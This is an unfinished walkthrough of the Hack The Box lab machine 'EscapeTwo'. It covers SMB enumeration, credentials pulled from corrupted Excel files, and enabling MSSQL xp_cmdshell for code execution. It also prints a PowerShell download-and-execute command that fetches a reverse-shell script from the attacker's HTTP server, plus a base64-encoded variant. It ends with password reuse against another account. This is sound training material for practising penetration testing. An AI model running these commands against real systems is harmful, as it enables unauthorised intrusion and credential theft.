# EscapeTwo
In progress...

- `10.10.11.51`
- Windows
- Easy

Windows machines are not my strong suit, so I need to get more practice in this regard. 
Fortunetely this is a pretty highly rated easy machine, so let's get started.

Interesting for this one. I don't usually see this on HTB. But we are given credentials right away. 

- username: `rose`
- password: `KxEPkKe6R8su`

## Enumeration

When scanning Windows machines we need the `-Pn` flag due to Windows not responding to ping from nmap. 

    nmap -Pn -sC -sV -vv 10.10.11.51

Wow it looks like there's a lot going on. Its possibly a domain controller.

Here's the first few ports before `NSE` starts doing its thing. 

Notably we have a `DNS` server. Also the usual `SMB` ports are open.

    PORT     STATE SERVICE       REASON  VERSION
    53/tcp   open  domain        syn-ack Simple DNS Plus
    88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-02-26 22:08:04Z)
    135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
    139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
    389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)

`LDAP` seems to be showing us some domain names. We can go ahead and add those to `/etc/hosts`. 

    |_ssl-date: 2025-02-26T22:08:51+00:00; -1s from scanner time.
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
    | Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
    | Public Key type: rsa
    | Public Key bits: 2048

It looks like encryption is standard too. 

Here's the next few ports

    445/tcp  open  microsoft-ds? syn-ack
    464/tcp  open  kpasswd5?     syn-ack
    593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)

This could be interesting... An exposed MSSQL server? 

    1433/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback

So... given that we started with creds. Lets just try enumerating the `SMB` shares first?

### SMB

    smbclient -U rose -L //DC01.sequel.htb/
    Password for [WORKGROUP\rose]: <enter password>

Cool. Here are the available shares.

    Sharename       Type      Comment
    ---------       ----      -------
    Accounting Department Disk
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    SYSVOL          Disk      Logon server share
    Users           Disk

Logging into users, we have a pretty standard user folder layout for Windows machines.
You can recursively grab the files with `smbclient` using this
snippit. 

    mask ""
    recurse on
    prompt off
    mget *

If we download all the files and look through them, there doesn't seem to by any red flags or obvious files. It looks like a fresh install. 

Lets look at `Accounting Department`. 

    smbclient -U rose //DC01.sequel.htb/sysvol
    Password for [WORKGROUP\rose]: <enter password> 

If we look in `Accounting Department`, we can see two interesting microsoft excel files. 

### Corrupted Excel Documents

    smb: \> ls
    .                                   D        0  Sun Jun  9 05:52:21 2024
    ..                                  D        0  Sun Jun  9 05:52:21 2024
    accounting_2024.xlsx                A    10217  Sun Jun  9 05:14:49 2024
    accounts.xlsx                       A     6780  Sun Jun  9 05:52:07 2024

                6367231 blocks of size 4096. 900477 blocks available

For some reason, they came to me corrupted. I went ahead and reset the machine just in case. 

Looks like they're still coming to me corrupted. I guess I will need to extract the data
by force.

An excel document is just a zip file with some metadata stored in various folders. In its
current iteration, it stores text (strings) in a file called `sharedStrings.xml`. 

    Archive:  accounts.xlsx
    file #1:  bad zipfile offset (local header sig):  0
        inflating: xl/workbook.xml
        inflating: xl/theme/theme1.xml
        inflating: xl/styles.xml
        inflating: xl/worksheets/_rels/sheet1.xml.rels
        inflating: xl/worksheets/sheet1.xml
        inflating: xl/sharedStrings.xml
        inflating: _rels/.rels
        inflating: docProps/core.xml
        inflating: docProps/app.xml
        inflating: docProps/custom.xml
        inflating: [Content_Types].xml

When we read that file after extracting `accounts.xlsx`, we see it contains a list of
usernames and passwords. Nice. 

It looks like one of the usernames is `sa@sequel.htb` with the password `MSSQL...` 

(I'm redacting the rest of the password so you can figure it out for yourself)

The password is a pretty heavy handed hint that our next location of interest is the open MSSQL server
that we spied earlier.

### MSSQL

Using the client that comes with MSSQL, we can connect to and query the database as the admin 

    sqlcmd -C -S dc01.sequel.htb -U sa -P MSSQL...

We need to use `-C` to disable certificate checking (it's self signed) 

    1> select name from sys.databases
    2> go

Looking at the tables we can only see the default ones. 

It doesn't seem like there's anything interesing in the database. 

However, this server is still insanely useful to us with our account. 

## Code Execution

One thing we can check for is `xp_cmdshell`. It's an optional feature for `MSSQL` 
server that allows the user to execute a cmd program. 

Let's check the configuration value. We need to enable advanced options first.

    1> exec sp_configure 'show advanced options', 1
    2> go
    1> reconfigure
    2> go
    1> exec sp_configure xp_cmdshell
    2> go

Looks like it's disabled. 

    name                                minimum     maximum     config_value run_value
    ----------------------------------- ----------- ----------- ------------ -----------
    xp_cmdshell                                   0           1            0           0

It looks like we have a database admin account though, so let's 
attempt to enable it. 

    1> exec sp_configure xp_cmdshell, 1
    2> go
    1> reconfigure
    2> go

And now we should have code execution! 

    1> exec xp_cmdshell 'powershell -command whoami'
    2> go

Nice. `Powershell` is there as expected.

    sequel\sql_svc

The easiest way to proceed going forward is with a reverse shell. You can find one for
`powershell` pretty easily online. I used [this one](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/3ad91872713d60888dca95850c3f6e706231cb40/powershell_reverse_shell.ps1) and changed the host and port to point
to my machine's listener. 

There are two ways to do this (that I know of). Let's go over both.

## Reverse Shell 

First thing we should do for both of our methods is set up our listener in a seperate session.

    nc -lvnp 42069

Our first method involves using an `HTTP` server to host the powershell script and invoking
it with `webclient.downloadstring` 

In a seperate session, host an `HTTP` server for the folder containing your reverse shell 
(here is an example with `python`). 

    python -m http.server 58008 -d ./shell_folder 

And in the `MSSQL` session invoke the web request like so.

    1> exec xp_cmdshell 'powershell -c "iex (new-object net.webclient).downloadstring(\"http://10.10.14.xxx:58008/shell.ps1\")"'
    2> go 

_OR..._ If you don't want to set up a web server, you can base64 encode the payload and pipe 
it directly into the `xp_cmdshell`. 

Just ensure you're encoding with the correct format for Windows. Windows uses UTF-16LE. To
convert from UTF-8 (linux) you can encode like this.

    cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0 

Take the output from that and paste it into the `MSSQL` client prompt. 

    1> exec xp_cmdshell 'powershell -e <base64>'
    2> go

You'll see it make a request to your web server, then you'll see a connection from netcat. 

    Listening on 0.0.0.0 42069
    Connection received on 10.10.11.51 50293
    <hit enter>
    PS C:\Windows\system32> 

## On The Box

Once you have a prompt, you can look around at the system files. To save us some time
let us focus on things we most likely have access to as the `sql_svc` user. 

Looking at the root folder, we see MSSQL2019 has been installed at that location. That 
seems like a good folder to check.

    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-----         6/8/2024   3:07 PM                1033_ENU_LP
    d-----         6/8/2024   3:07 PM                redist
    d-----         6/8/2024   3:07 PM                resources
    d-----         6/8/2024   3:07 PM                x64
    -a----        9/24/2019  10:03 PM             45 AUTORUN.INF
    -a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML
    -a----         6/8/2024   3:07 PM             16 PackageId.dat
    -a----        9/24/2019  10:03 PM         142944 SETUP.EXE
    -a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG
    -a----         6/8/2024   3:07 PM            717 sql-Configuration.INI
    -a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL


    PS C:\SQL2019\ExpressAdv_ENU> 

That `sql-Configuration.INI` contains the passwords needed to authenticate with the sql 
server. 

That's great. We can try to authenticate with the `sql_svc` user. It shows in the file 
that this account is linked to that password. 

Hmm. Neither `sql_svc` nor `Administrator` worked. 

Let's see which users exist on this system. 

    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-----       12/25/2024   3:10 AM                Administrator
    d-r---         3/7/2025   6:59 AM                Public
    d-----         6/9/2024   4:15 AM                ryan
    d-----         6/8/2024   4:16 PM                sql_svc


    PS C:\users> 

Okay... Let's try this password with `ryan` then? 

    smbclient -U ryan //DC01.sequel.htb/Users
    Password for [WORKGROUP\ryan]: <enter password>

Awesome! We can log in! 

![user.txt](/static/media/ctf/htb-escapetwo-user.png)

Noticing a new `ryan` folder in the share, we can find the `user.txt`

TO BE CONTINUED...